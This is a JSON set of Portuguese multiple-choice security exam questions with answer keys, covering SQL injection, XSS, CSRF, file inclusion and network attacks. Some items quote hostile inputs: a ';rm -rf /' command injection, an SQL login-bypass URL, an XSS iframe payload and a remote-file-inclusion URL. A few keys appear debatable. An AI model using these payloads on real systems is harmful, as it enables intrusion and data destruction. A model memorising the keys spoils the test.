+        "enunciado": "Uma aplicação web permite que usuários façam login usando credenciais armazenadas em banco de dados. Um teste de segurança identificou que a aplicação é vulnerável a SQL Injection no campo de senha.\nA técnica de mitigação mais efetiva para corrigir essa vulnerabilidade é",
+        "alternativas": [
+            "implementar validação de entrada apenas no lado cliente usando JavaScript.",
+            "criptografar a conexão com o banco de dados usando SSL/TLS.",
+            "utilizar consultas parametrizadas (prepared statements) no acesso ao banco de dados.",
+            "implementar rate limiting para limitar tentativas de login.",
+            "armazenar as senhas em texto claro para facilitar a validação."
+        ],
+        "gabarito": "utilizar consultas parametrizadas (prepared statements) no acesso ao banco de dados."
+    },
+    {
+        "id": 52,
+        "enunciado": "Um perito analisa uma invasão em um sistema corporativo que utiliza SAML SSO. O atacante interceptou o token SAML e modificou seu conteúdo, conseguindo que o Service Provider aceitasse o token falsificado.\nA vulnerabilidade que permitiu esse ataque foi",
+        "alternativas": [
+            "falha na validação da expiração do token.",
+            "falha na verificação da assinatura XML (XML Signature Wrapping).",
+            "token JWT malformado.",
+            "falha no DNSSEC.",
+            "senha fraca no Identity Provider."
+        ],
+        "gabarito": "falha na verificação da assinatura XML (XML Signature Wrapping)."
+    },
+    {
+        "id": 53,
+        "enunciado": "Analistas do TCE-RR utilizavam uma plataforma web interna para registrar auditorias. Durante a análise de segurança, foi detectado que áreas de entrada de texto na plataforma, usadas para registrar observações em relatórios, continham código malicioso armazenado no servidor.\nEsse código era executado automaticamente no navegador de qualquer funcionário que visualizasse os relatórios, redirecionando-os para sites fraudulentos.\nNesse contexto, o ataque foi identificado como",
+        "alternativas": [
+            "injeção de código em XML (XML Injection).",
+            "injeção de código por buffer overflow.",
+            "Cross-Site Scripting (XSS) persistente.",
+            "Cross-Site Scripting (XSS) refletido.",
+            "Cross-Site Scripting (XSS) baseado em DOM."
+        ],
+        "gabarito": "Cross-Site Scripting (XSS) persistente."
+    },
+    {
+        "id": 54,
+        "enunciado": "A página web da sociedade empresária Exemplo1234, disponível na internet, permite que internautas acessem o edital de uma vaga de trabalho por meio do endereço eletrônico http://empresa1234.com/vaga.php?file=vaga.pdf.\nDurante a verificação de vulnerabilidades contratada por essa empresa, foi observado que o servidor da página web da Empresa1234 processava o valor fornecido no parâmetro file sem realizar validação ou sanitização adequada.\nComo resultado, foi possível incluir e executar no servidor o conteúdo de um arquivo malicioso hospedado no endereço http://testevulnerabilidade.com/badpage.php O teste foi realizado utilizando o seguinte endereço:\nhttp://empresa1234.com/vaga.php?file=http://testevulnerabilida de.com/badpage.php Ao acessar essa URL, o conteúdo do arquivo badpage.php foi carregado e executado diretamente pelo servidor da Empresa1234, comprometendo sua segurança.\nO tipo de vulnerabilidade presente no servidor de página da Empresa1234 é o",
+        "alternativas": [
+            "LFI – Local File Inclusion.",
+            "XSS – Cross-Site Scripting.",
+            "SQL Injection.",
+            "RFI – Remote File Inclusion.",
+            "FPD – Full Path Disclosure."
+        ],
+        "gabarito": "RFI – Remote File Inclusion."
+    },
+    {
+        "id": 55,
+        "enunciado": "O tipo de falha de segurança mais comum nos aplicativos web são as falhas de validação na entrada de dados. Essa vulnerabilidade abre a possibilidade de ocorrem diversos tipos de ataques. Com relação aos requisitos de segurança que um aplicativo web devem adotar, analise os itens a seguir.\nI. A validação dos dados de entrada e codificação dos dados de saída nas aplicações web deve ser bem definida para evitar ataques do tipo injeção.\nII. Os dados de entrada devem ser fortemente tipados e validados, devem ter intervalo e comprimento verificados e, na pior das hipóteses devem ser higienizados ou filtrados.\nIII. Os dados de saída dever ser criptografados em infraestruturas de PKI e armazenados em bancos de dados seguros, tornando-se pouco disponíveis para maus usos.\nEstá correto o que se afirma em",
+        "alternativas": [
+            "II e III, apenas.",
+            "I e III, apenas.",
+            "I e II, apenas.",
+            "III, apenas.",
+            "II, apenas."
+        ],
+        "gabarito": "I e II, apenas."
+    },
+    {
+        "id": 56,
+        "enunciado": "Analise as afirmativas a seguir sobre mecanismos de segurança em aplicações Django:\nI. O Django implementa proteção contra CSRF por padrão em todas as views, exceto aquelas que utilizam o decorator @csrf_exempt.\nII. Middlewares como SecurityMiddleware ajudam a reforçar políticas de cabeçalhos HTTP como Strict-Transport-Security e X-Content-Type- Options.\nIII. A autenticação baseada em sessão (SessionAuthentication) expõe o sistema a ataques CSRF caso usada sem HTTPS.\nEstá correto o que se afirma em",
+        "alternativas": [
+            "I e III, apenas.",
+            "I, apenas.",
+            "II e III, apenas.",
+            "I, II e III.",
+            "II, apenas."
+        ],
+        "gabarito": "I, II e III."
+    },
+    {
+        "id": 57,
+        "enunciado": "Uma aplicação web corporativa está vulnerável aos ataques em que usuários maliciosos conseguem fazer a aplicação executar comandos arbitrários do sistema operacional por meio da manipulação de parâmetros que são passados diretamente para funções de execução de processos no servidor.\nEste tipo de vulnerabilidade caracteriza-se como",
+        "alternativas": [
+            "SQL Injection.",
+            "Path Traversal.",
+            "Command Injection.",
+            "Cross-Site Scripting (XSS).",
+            "XML External Entity (XXE)."
+        ],
+        "gabarito": "Command Injection."
+    },
+    {
+        "id": 58,
+        "enunciado": "Ao desenvolver a área de intranet da Assembleia, o Analista de Sistemas deve se proteger contra ataques de Cross-Site Scripting (XSS), que ocorrem quando um invasor injeta código malicioso no navegador de um usuário. A principal linha de defesa contra a maioria dos ataques XSS, aplicada na saída de dados do servidor para o browser, é",
+        "alternativas": [
+            "o Output Encoding de dados não confiáveis.",
+            "implementar Rate Limiting no backend.",
+            "utilizar senhas fortes e únicas para cada usuário.",
+            "usar Prepared Statements no banco de dados.",
+            "bloquear todas as requisições HTTP do tipo POST."
+        ],
+        "gabarito": "o Output Encoding de dados não confiáveis."
+    },
+    {
+        "id": 59,
+        "enunciado": "O Cross-Site-Scripting, também conhecido como (XSS), é um dos defeitos de segurança mais comumente encontrados em aplicações web, permitindo utilizar uma aplicação vulnerável para transportar código malicioso até o navegador de outro usuário. Dependendo de como o código malicioso é transportado até o navegador da vítima e do local em que a vulnerabilidade ocorre (no servidor ou no cliente), um XSS pode ser classificado de vários tipos.\nO tipo de XSS que o código malicioso é enviado na URL ou no cabeçalho HTTP, como parte da requisição, explorando um parâmetro que é exibido sem tratamento na página resultante, é o:",
+        "alternativas": [
+            "XSS baseado em DOM;",
+            "XSS refletido;",
+            "XSS armazenado;",
+            "XCS ou Cross Chanel Scripting;",
+            "XSS baseado em CSRF."
+        ],
+        "gabarito": "XSS refletido;"
+    },
+    {
+        "id": 60,
+        "enunciado": "A equipe de Segurança da Informação (SI) de um órgão público realizou varreduras de vulnerabilidades em seus ativos a fim de reduzir a exposição dos sistemas aos riscos. Durante a varredura, a equipe de SI identificou que um dos sistemas tinha uma vulnerabilidade que permitia a inserção de scripts maliciosos na aplicação, alterando o conteúdo dinâmico que o usuário recebia em seu navegador, redirecionando-o para um site falso.\nA vulnerabilidade identificada permitia um ataque de:",
+        "alternativas": [
+            "backdoor;",
+            "rootkit;",
+            "session hijacking;",
+            "cross-site scripting;",
+            "SQL injection."
+        ],
+        "gabarito": "cross-site scripting;"
+    },
+    {
+        "id": 61,
+        "enunciado": "Em um cenário de segurança da informação, uma determinada vulnerabilidade permite que um atacante force um usuário final a executar ações indesejadas em uma aplicação web na qual ele está autenticado.\nIsso é feito por meio de solicitações HTTP forjadas vindas de um site controlado pelo atacante. Esta técnica explora a confiança que uma aplicação web tem no usuário, permitindo o ataque sem que o usuário esteja ciente de sua ação.\nEsta vulnerabilidade pode ser explorada em diversos contextos, incluindo hardware, software, sistemas operacionais, aplicações, bancos de dados, redes, pessoas e ambientes físicos, uma vez que depende da interação do usuário com uma aplicação web através de um navegador.\nNesse contexto, a vulnerabilidade de segurança descrita é chamada",
+        "alternativas": [
+            "SQL Injection.",
+            "Cross-Site Scripting (XSS).",
+            "Cross-Site Request Forgery (CSRF).",
+            "Man-in-the-Middle (MitM).",
+            "Spoofing."
+        ],
+        "gabarito": "Cross-Site Request Forgery (CSRF)."
+    },
+    {
+        "id": 62,
+        "enunciado": "O fragmento de código a seguir recebe o nome de um arquivo como parâmetro da linha de comando e mostra o seu conteúdo ao usuário. O script é configurado com setuid root, pois visa servir como uma ferramenta educacional para permitir que administradores de sistemas em treinamento examinem arquivos privilegiados do sistema, sem conceder-lhes a capacidade de alterá-los ou causar danos ao sistema.\nint main(char* argc, char** argv) { char cmd[CMD_MAX] = \"/usr/bin/cat \";\nstrcat(cmd, argv[1]);\nsystem(cmd);\n} Dado que o programa opera com privilégios de administrador, a função system() é igualmente executada com tais privilégios. Quando um usuário fornece um nome de arquivo padrão, a chamada funciona como esperado. Contudo, se um invasor inserir uma string como \";rm -rf /\", a chamada system() falhará ao tentar executar o comando \"cat\" por falta de argumentos, resultando na tentativa subsequente de",
+        "alternativas": [
+            "excluir recursivamente todo o conteúdo da partição raiz, configurando um ataque do tipo Denial of Service.",
+            "excluir recursivamente todo o conteúdo da partição raiz, configurando um ataque do tipo Command Injection.",
+            "copiar recursivamente todo o conteúdo da partição raiz, configurando um ataque do tipo Direct Dynamic Code Evaluation.",
+            "copiar recursivamente todo o conteúdo da partição raiz, configurando um ataque do tipo Code Injection.",
+            "excluir recursivamente todo o conteúdo da partição raiz, onfigurando um ataque do tipo Man-in-the-middle."
+        ],
+        "gabarito": "excluir recursivamente todo o conteúdo da partição raiz, configurando um ataque do tipo Command Injection."
+    },
+    {
+        "id": 63,
+        "enunciado": "Um servidor de páginas web, Ubuntu Server, publicou na internet um portal de notícias com uma vulnerabilidade. Ela permite que os clientes maliciosos deste servidor tenham acesso a sua estrutura de arquivos e diretórios por meio da manipulação das informações demandadas por uma variável PHP apresentada na URL de acesso desta página web.\nAssinale, entre as opções abaixo, aquela que apresenta o tipo de vulnerabilidade presente nesta página web.",
+        "alternativas": [
+            "LFI – Local File Inclusion.",
+            "RFI – Remote File Inclusion.",
+            "XSS – Cross-Site Scripting.",
+            "SQL Injection.",
+            "FPD – Full Path Disclosure."
+        ],
+        "gabarito": "FPD – Full Path Disclosure."
+    },
+    {
+        "id": 64,
+        "enunciado": "Conforme a tecnologia avança e cada vez mais utilizamos serviços ligados a redes de computadores, as ameaças cibernéticas também vão se diversificando com o surgimento de novas formas de ataques digitais.\nRelacione os tipos de ataque listados a seguir às respectivas descrições.\n1. DoS\n2. Cross-Site Scripting (XSS)\n3. Cross-Site Request Forgery\n4. Injection\n( ) ataque em que os criminosos injetam scripts maliciosos no conteúdo de um site de outra forma confiável, visando atacar usuários visitantes do site.\n( ) ataque em que o criminoso insere código malicioso em campos de entrada, sites, programa ou outros, com a finalidade de executar comandos que podem, por exemplo, ler ou modificar um banco de dados ou alterar dados em um site.\n( ) ataque no qual o criminoso faz com que um usuário autenticado em um aplicativo web realize ações não intencionais sem que ele perceba.\n( ) ataque no qual o criminoso tem por objetivo tornar um computador, servidor ou serviço indisponível para os usuários a que se destinam, interrompendo o funcionamento normal do dispositivo.\nAssinale a opção que indica a relação correta na ordem apresentada.",
+        "alternativas": [
+            "1 – 3 – 4 – 2.",
+            "2 – 4 – 3 – 1.",
+            "3 – 4 – 2 – 1.",
+            "4 – 3 – 1 – 2.",
+            "4 – 2 – 1 – 3."
+        ],
+        "gabarito": "2 – 4 – 3 – 1."
+    },
+    {
+        "id": 65,
+        "enunciado": "Em uma aplicação web que exibe dados dinâmicos provenientes de usuários, o método mais eficaz para prevenir ataques de Cross-Site Scripting (XSS), entre as opções abaixo, é",
+        "alternativas": [
+            "utilizar HTTPS para todas as comunicações entre cliente e servidor.",
+            "implementar cabeçalhos de segurança HTTP como Content Security Policy (CSP).",
+            "validar os dados do usuário apenas no lado do cliente utilizando JavaScript.",
+            "utilizar tokens de sessão com tempo de expiração curto.",
+            "fazer backup regular dos dados do usuário."
+        ],
+        "gabarito": "implementar cabeçalhos de segurança HTTP como Content Security Policy (CSP)."
+    },
+    {
+        "id": 66,
+        "enunciado": "Um analista estava acessando uma página de Internet Banking autêntica, e realizou normalmente sua autenticação, recebendo um cookie de sessão. Em paralelo a isso, também estava verificando sua caixa de correio eletrônico, e clicou em um link suspeito que recebeu em um e-mail. Mais tarde, ao verificar seu extrato bancário, percebeu inúmeras operações que ele não realizou. Ao fazer contato com seu banco, o mesmo informou que as operações foram realizadas a partir do usuário autenticado do cliente.\nCom base nessas informações, assinale a opção que apresenta o ataque sofrido.",
+        "alternativas": [
+            "SQL Injection.",
+            "CSRF.",
+            "XSS.",
+            "Spoofing.",
+            "DDoS."
+        ],
+        "gabarito": "CSRF."
+    },
+    {
+        "id": 67,
+        "enunciado": "O desenvolvimento seguro é a prática de integrar segurança em todas as fases do ciclo de vida do software, prevenindo vulnerabilidades e protegendo dados. Um tipo de vulnerabilidade web, bastante explorada por hackers, permite que códigos maliciosos sejam inseridos nessas páginas para roubar informações sensíveis, redirecionar usuários a sites falsos, ou manipular o conteúdo da página de outras formas.\nAssinale a opção que apresenta o tipo de vulnerabilidade descrita no texto acima.",
+        "alternativas": [
+            "LFI – Local File Inclusion.",
+            "RFI – Remote File Inclusion.",
+            "XSS - Cross-Site Scripting.",
+            "SQL Injection.",
+            "FPD – Full Path Disclosure."
+        ],
+        "gabarito": "XSS - Cross-Site Scripting."
+    },
+    {
+        "id": 68,
+        "enunciado": "Considere o seguinte diagrama:\nVamos assumir que:\nO cenário representa a rede da empresa hipotética XPTO.\nNem todos os dispositivos foram representados Os dispositivos possuem as seguintes configurações:\nServidor A: IP: 10.77.8.10/20 – Função: Servidor de banco de dados SQL.\nServidor B: IP: 10.77.8.11/20 – Função: Servidor de aplicações http / https. – As aplicações utilizam os bancos de dados no Servidor A.\nFirewall A: WAN IP: 73.12.78.44/24 IP: 10.77.0.1/20 – Funções – NGFW, Servidor de VPN, DHCP, DNS.\nComputador 1:\nWAN IP: 200.255.10.22/24 VPN IP: 10.17.16.22/23.\nComputador 2:\nIP: 10.77.1.16/20 Dispositivo móvel 1: WAN IP: 65.12.8.33/24 VPN IP: 10.17.17.26/23.\nAs pessoas A, B e C são funcionários da empresa XPTO.\nO Servidor B possui aplicações corporativas que atendem a funcionários e clientes e estão publicadas na internet.\nDurante uma análise de logs no Servidor B encontrou-se o seguinte registro:\nhttps://www.minhaaplicacao.com.br/atualizacao?mensagem=<script>document.write(“<iframe width=’0’ height=’0’ src=’https://ssite.cn’></iframe>”</script> Um exemplo da chamada comum para este registro seria:\nhttps://www.minhaaplicacao.com.br/atualizacao?mensagem=Aviso de nova publicação Identificou-se também que o campo mensagem é utilizado na composição do site e seu conteúdo aparece como parte do html dele.\nA seguinte opção é consistente com um ataque que geraria um log deste tipo:",
+        "alternativas": [
+            "Distributed Denial of Service.",
+            "SQL Injection.",
+            "Cross-site Scripting ou XSS.",
+            "Man in the middle.",
+            "Phishing."
+        ],
+        "gabarito": "Cross-site Scripting ou XSS."
+    },
+    {
+        "id": 69,
+        "enunciado": "Yanni, analista de segurança, necessita prever e testar tipos potenciais de entradas não padronizadas que poderiam ser exploradas por um atacante para subverter um programa. Nesse contexto, Yanni afirma que:",
+        "alternativas": [
+            "a técnica de fuzzing é um protocolo de teste de software que usa dados gerados aleatoriamente como entradas para um programa;",
+            "a técnica de fuzzing é também usada por atacantes para identificar bugs potencialmente úteis em softwares comumente utilizados;",
+            "a principal desvantagem da técnica de fuzzing é sua complexidade e o fato de ser livre de suposições sobre a entrada esperada por qualquer programa;",
+            "a capacidade de aplicação em argumentos passados em linhas de comando e protocolos de rede são algumas vulnerabilidades da técnica de fuzzing;",
+            "as saídas também podem ser geradas de acordo com algum gabarito. Tais gabaritos são projetados para examinar cenários com baixa probabilidade de bugs."
+        ],
+        "gabarito": "a técnica de fuzzing é também usada por atacantes para identificar bugs potencialmente úteis em softwares comumente utilizados;"
+    },
+    {
+        "id": 70,
+        "enunciado": "Clickjacking (ou UI redressing attack) é uma das formas de ataques perigosos em aplicações Web.\nAssinale a opção que descreve uma forma de proteção, mesmo parcial, contra clickjacking.",
+        "alternativas": [
+            "A aplicação deve fazer uso e checagem de tokens aleatórios nos formulários.",
+            "O lado servidor da aplicação deve fazer uso do cabeçalho HTTP X-Frame-Options com a opção DENY.",
+            "Cookies usados pela aplicação devem ser criados com a opção Secure.",
+            "Entradas de dados de usuários na aplicação devem ser filtradas para evitar o uso de comandos SQL.",
+            "O lado cliente da aplicação deve evitar o redirecionamento de páginas para o protocolo HTTP não seguro."
+        ],
+        "gabarito": "O lado servidor da aplicação deve fazer uso do cabeçalho HTTP X-Frame-Options com a opção DENY."
+    },
+    {
+        "id": 71,
+        "enunciado": "Em aplicações Web, a vulnerabilidade denominada CSRF (cross site request forgery) ocorre quando solicitações não autorizadas a um website são enviadas a partir de um equipamento onde existe uma sessão ativa em que o website confia.\nUma forma de se proteger desse ataque é a(o)",
+        "alternativas": [
+            "desativação do recurso HSTS.",
+            "uso de cabeçalho X-Csrf-Protection nas requisições GET.",
+            "uso do atributo httponly nos cookies utilizados.",
+            "uso de tokens anti-csrf pela aplicação.",
+            "garantia que os cookies não serão enviados em texto claro na rede."
+        ],
+        "gabarito": "uso de tokens anti-csrf pela aplicação."
+    },
+    {
+        "id": 72,
+        "enunciado": "Um invasor detecta e explora uma vulnerabilidade em um campo de formulário em uma página de uma aplicação Web e, consegue injetar um script malicioso dentro de uma postagem em uma rede social. Isso possibilita que qualquer usuário dessa rede social, ao visualizar tal postagem contaminada, tenha a sua máquina infectada pelo script malicioso, que é executado localmente.\nA este ataque é dado o nome de",
+        "alternativas": [
+            "Database Injection.",
+            "XSRF.",
+            "XSS em DOM.",
+            "XSS armazenado.",
+            "XSS refletido."
+        ],
+        "gabarito": "XSS armazenado."
+    },
+    {
+        "id": 73,
+        "enunciado": "Um atacante utilizou um motor de buscas para detectar um website com componentes vulneráveis. Ele verificou que a aplicação dinamicamente incluía scripts externos, e assim conseguiu fazer o upload de um script malicioso hospedado em um site controlado pelo atacante.\nEsse comprometimento permitiu a alteração e remoção de páginas, bem como o sequestro do servidor para ser utilizado como um bot de DDoS. Por fim, dados foram afetados, com roubo de senhas e informações.\nA primeira vulnerabilidade explorada, que permitiu todos esses ataques, foi",
+        "alternativas": [
+            "xss.",
+            "remote file inclusion.",
+            "defacement.",
+            "ransomware.",
+            "xsrf."
+        ],
+        "gabarito": "remote file inclusion."
+    },
+    {
+        "id": 74,
+        "enunciado": "A equipe de segurança de um órgão público detectou em seus sistemas de monitoramento a seguinte requisição em direção a um site do órgão:\nhttp://www.site.gov.br/index.php?username=1'%20or%20'1'%20 =%20'1'))/*&password=t&$t3.\nO tipo e a técnica de ataque detectados são, respectivamente:",
+        "alternativas": [
+            "HTML injection, com o objetivo de alterar a página de login;",
+            "SQL injection, com o objetivo de bypassar a página de login;",
+            "SQL injection, com o objetivo de forçar o banco de dados a gerar um erro;",
+            "Command injection, com o objetivo de realizar a execução de código na página de login;",
+            "Command injection, com o objetivo de forçar o banco de dados a gerar um erro."
+        ],
+        "gabarito": "SQL injection, com o objetivo de bypassar a página de login;"
+    },
+    {
+        "id": 75,
+        "enunciado": "Um ataque perigoso para aplicações web é o clickjacking, uma técnica maliciosa que induz o usuário a clicar em algo diferente do que ele enxerga, potencialmente podendo causar ações indesejadas ou revelar informações confidenciais.\nUma forma de a aplicação web tentar evitar que esse ataque ocorra é pelo uso do(a):",
+        "alternativas": [
+            "extensão Expect-CT;",
+            "cabeçalho X-Frame-Options;",
+            "protocolo Strict-Transport-Security;",
+            "atributo Secure em cookies;",
+            "cabeçalho X-Xss-Protection."
+        ],
+        "gabarito": "cabeçalho X-Frame-Options;"
+    },
+    {
+        "id": 76,
+        "enunciado": "Um analista de TI descobriu que teve sua conta comprometida a partir de um código javascript malicioso num site que está habituado a acessar. Ao analisar a página acessada, identificou que existia uma vulnerabilidade que permitia que tags HTML fossem incorporadas na seção de comentários da página, de maneira permanente.\nO ataque sofrido na página foi:",
+        "alternativas": [
+            "Cross-Site Scripting (XSS) refletido;",
+            "Cross-Site Scripting (XSS) persistente;",
+            "SQL Injection;",
+            "LDAP Injection;",
+            "Decoy."
+        ],
+        "gabarito": "Cross-Site Scripting (XSS) persistente;"
+    },
+    {
+        "id": 77,
+        "enunciado": "Com referência à segurança de dados sigilosos, uma das técnicas utilizadas por hackers é a adição de código quando da entrada de dados em sistemas de informação. Essa técnica é conhecida como",
+        "alternativas": [
+            "Man-in-the-middle.",
+            "Cavalo de Troia.",
+            "SQL injection.",
+            "Phishing.",
+            "DDoS."
+        ],
+        "gabarito": "SQL injection."
+    },
+    {
+        "id": 78,
+        "enunciado": "SQL Injection é uma técnica de ataque na qual o invasor se aproveita de falhas em aplicativos web que interagem com bases de dados para inserir uma instrução SQL personalizada e indevida.\nPara evitar essa ameaça de segurança, é necessário:",
+        "alternativas": [
+            "utilizar expressões regulares para cifrar as variáveis enviadas para o sistema;",
+            "concatenar diretamente o input do usuário com a consulta SQL;",
+            "encapsular as entradas de dados dentro de aspas simples ao montar dinamicamente consultas SQL;",
+            "retornar no corpo das respostas HTTP as mensagens de erro em bancos de dados;",
+            "validar todas as entradas de dados, como formulários ou URL da aplicação."
+        ],
+        "gabarito": "validar todas as entradas de dados, como formulários ou URL da aplicação."
+    },
+    {
+        "id": 79,
+        "enunciado": "A analista Joana deve investigar anomalias no tráfego da rede B do MPU. A rede B interliga os dispositivos por um switch padrão. A fim de facilitar a investigação, Joana decidiu capturar todos os pacotes trafegados por qualquer dispositivo da rede B (sniffing geral), utilizando apenas um software sniffer no computador PC, conectado à rede B. A analista executou um ataque controlado à rede B, fazendo com que o switch padrão se comportasse como um simples hub. Joana avaliou ainda se havia necessidade de definir a única placa de rede do PC, a IBNet, para operar no modo promíscuo.\nPara cumprir o objetivo de investigar toda a rede B, Joana realizou um ataque do tipo:",
+        "alternativas": [
+            "ARP spoofing, e precisou alterar o modo de operação da IBNet;",
+            "MAC flooding, e precisou alterar o modo de operação da IBNet;",
+            "ARP flooding, e não precisou alterar o modo de operação da IBNet;",
+            "MAC flooding, e não precisou alterar o modo de operação da IBNet;",
+            "MAC spoofing, e não precisou alterar o modo de operação da IBNet."
+        ],
+        "gabarito": "MAC flooding, e precisou alterar o modo de operação da IBNet;"
+    },
+    {
+        "id": 80,
+        "enunciado": "Uma empresa de segurança observou que os pacotes transmitidos começaram a não chegar em seus destinos. Suas mensagens eram cifradas com o RSA e estavam sendo direcionadas para uma outra máquina intrusa. O responsável pela segurança foi informado e conseguiu invadir a máquina do destino dos pacotes e identificou que os pacotes sofriam ataques de temporização, ou seja, tentava identificar a variação de tempo em implementações da exponenciação modular (como no RSA). Para dificultar o ataque, foi utilizada a técnica de multiplicar o texto cifrado por um número aleatório antes de realizar a exponenciação.\nEm seu relatório, o responsável pela segurança descreveu a técnica usada como:",
+        "alternativas": [
+            "tempo de exponenciação constante;",
+            "atraso aleatório;",
+            "análise eletromagnética simples;",
+            "ofuscação;",
+            "análise de potência simples."
+        ],
+        "gabarito": "ofuscação;"
+    },
+    {
+        "id": 81,
+        "enunciado": "Um intruso atacou os servidores DNS do Ministério Público da União (MPU) enviando centenas de solicitações de DNS para o domínio do MPU, assim como um conjunto de respostas falsificadas para as solicitações fingindo ser um servidor de nomes de nível seguinte e carregando uma suposição diferente para o ID da consulta.\nO servidor de nomes local armazenou o mapeamento em seu cache. Nesse momento, o invasor passou a atuar como intermediário entre os clientes e o servidor (man-in- the-middle). Após isso, o invasor continuou a atacar não um único site, mas a zona inteira de DNS's.\nA Divisão de Segurança do MPU iniciou a busca pela solução ao ataque de:",
+        "alternativas": [
+            "Kaminsky;",
+            "spoofing de conexão;",
+            "sequestro de conexão;",
+            "envenenamento de ARP;",
+            "canal lateral."
+        ],
+        "gabarito": "Kaminsky;"
+    },
+    {
+        "id": 82,
+        "enunciado": "Apesar de ser considerado um protocolo robusto para Redes Wi-Fi, o WPA2 ainda apresenta algumas vulnerabilidades.\nO ataque que explora uma vulnerabilidade na autenticação da chave de grupo do WPA2, possibilitando que um invasor intercepte e manipule o tráfego de dados entre um dispositivo cliente e um ponto de acesso sem fio, é denominado",
+        "alternativas": [
+            "DDoS.",
+            "KRACK.",
+            "MiTM.",
+            "Rogue AP.",
+            "Poison ARP."
+        ],
+        "gabarito": "KRACK."
+    },
+    {
+        "id": 83,
+        "enunciado": "Durante uma auditoria na rede de computadores da empresa XXX Ltda, foi identificado que um hacker insider não autorizado realizou alteração no programa de pagamento de funcionários da empresa para que ele rodasse de modo diferente do habitual.\nA alternativa que indica corretamente o nome desse tipo de ataque e sua caracterização é:",
+        "alternativas": [
+            "ataque de interceptação – ocorre quando um ativo é destruído ou torna-se indisponível (ou inutilizável), caracterizando um ataque contra a disponibilidade;",
+            "ataque de interrupção – ocorre quando um ativo é acessado por uma parte não autorizada (pessoa, programa ou computador), caracterizando um ataque contra a confidencialidade;",
+            "ataque de modificação – ocorre quando um ativo é acessado por uma parte não autorizada (pessoa, programa ou computador) e ainda alterado, caracterizando um ataque contra a integridade;",
+            "ataque de fabricação – ocorre quando uma parte não autorizada (pessoa, programa ou computador) insere objetos falsificados em um ativo, caracterizando um ataque contra a disponibilidade;",
+            "ataque de negação – ocorre quando um ativo é acessado por uma parte não autorizada (pessoa, programa ou computador) negando ao sistema a capacidade de ser executado do modo habitual."
+        ],
+        "gabarito": "ataque de modificação – ocorre quando um ativo é acessado por uma parte não autorizada (pessoa, programa ou computador) e ainda alterado, caracterizando um ataque contra a integridade;"
+    },
+    {
+        "id": 84,
+        "enunciado": "Um dado sensível armazenado em um banco de dados foi exibido parcialmente em uma view de sistema tendo alguns trechos exibidos como “***” intercalados com os dados reais.\nSabendo-se que o dado original permanece íntegro e não cifrado no banco de dados, a técnica utilizada foi",
+        "alternativas": [
+            "tokenização.",
+            "máscara dinâmica de dados.",
+            "data shuffling.",
+            "data anonymization.",
+            "Transparent Data Encryption."
+        ],
+        "gabarito": "máscara dinâmica de dados."
+    },
+    {
+        "id": 85,
+        "enunciado": "André acessou o serviço de correio eletrônico do TRF1 por meio de seu dispositivo móvel conectado a uma rede sem fio disponível no aeroporto.\nDurante o período de utilização dessa rede sem fio, o tráfego de rede foi monitorado e as credenciais de acesso de André foram capturadas.\nO comportamento irregular dessa conta de correio eletrônico foi observado pela equipe de suporte técnico, que a bloqueou preventivamente.\nA conduta de André possibilitou a exploração da:",
+        "alternativas": [
+            "ameaça tráfego sensível desprotegido;",
+            "ameaça armazenamento desprotegido;",
+            "ameaça serviços desnecessários habilitados;",
+            "vulnerabilidade uso incorreto de dispositivo;",
+            "vulnerabilidade conexões de rede pública desprotegida."
+        ],
+        "gabarito": "vulnerabilidade conexões de rede pública desprotegida."
+    },
+    {
+        "id": 86,
+        "enunciado": "Claudio é o administrador de sistemas de uma grande empresa de tecnologia. Ele começou a notar que, em momentos aleatórios, alguns servidores críticos da empresa são interrompidos, paralisando importantes operações de negócios. Após uma investigação aprofundada, Claudio descobre que esses incidentes estão ocorrendo devido a um tipo específico de ataque que usa pacotes cuja estrutura aciona um bug no software de tratamento de rede do sistema. Isso significa que o sistema não pode mais se comunicar pela rede até esse software ser reativado, em geral mediante a reinicialização do sistema-alvo.\nEsse tipo de ataque denomina-se:",
+        "alternativas": [
+            "spoofing;",
+            "phishing;",
+            "man-in-the-middle;",
+            "pacote envenenado;",
+            "retrodifusão de tráfego."
+        ],
+        "gabarito": "pacote envenenado;"
+    },
+    {
+        "id": 87,
+        "enunciado": "O traffic shaping é uma técnica usada em redes de computadores para gerenciar o fluxo de dados, permitindo um controle mais eficiente sobre os pacotes transmitidos. Essa abordagem não apenas influencia o desempenho geral da rede, mas também pode impactar a segurança das comunicações.\nNesse contexto, assinale a opção que apresenta um benefício relevante do traffic shaping em termos de segurança de redes.",
+        "alternativas": [
+            "Impede que usuários acessem sites maliciosos por meio de filtros de conteúdo.",
+            "Garante a criptografia de todos os pacotes transmitidos entre dispositivos na rede.",
+            "Realiza a inspeção profunda de pacotes para detectar ameaças em tempo real.",
+            "Limita a quantidade de dispositivos simultâneos na rede para garantir a disponibilidade.",
+            "Diminui a probabilidade de ataques de negação de serviço (DoS) ao controlar a taxa de transmissão de pacotes."
+        ],
+        "gabarito": "Diminui a probabilidade de ataques de negação de serviço (DoS) ao controlar a taxa de transmissão de pacotes."
+    },
+    {
+        "id": 88,
+        "enunciado": "O analista Cléber instalou a rede sem fio MinhaWifi no prédio do TCE/TO. A MinhaWifi é uma rede aberta que não possui senha e aceita conexões de qualquer host.\nCléber utilizou a MinhaWifi por alguns dias para navegar na Internet. Porém, nesse mesmo período, um atacante ingressou na MinhaWifi e passou a monitorar os dados de Cléber trafegados em claro, roubando informações confidenciais.\nPortanto, Cléber foi vítima de um ataque passivo do tipo:",
+        "alternativas": [
+            "SYN flood;",
+            "ping flood;",
+            "spoofing;",
+            "phishing;",
+            "eavesdropping."
+        ],
+        "gabarito": "eavesdropping."
+    }
+]
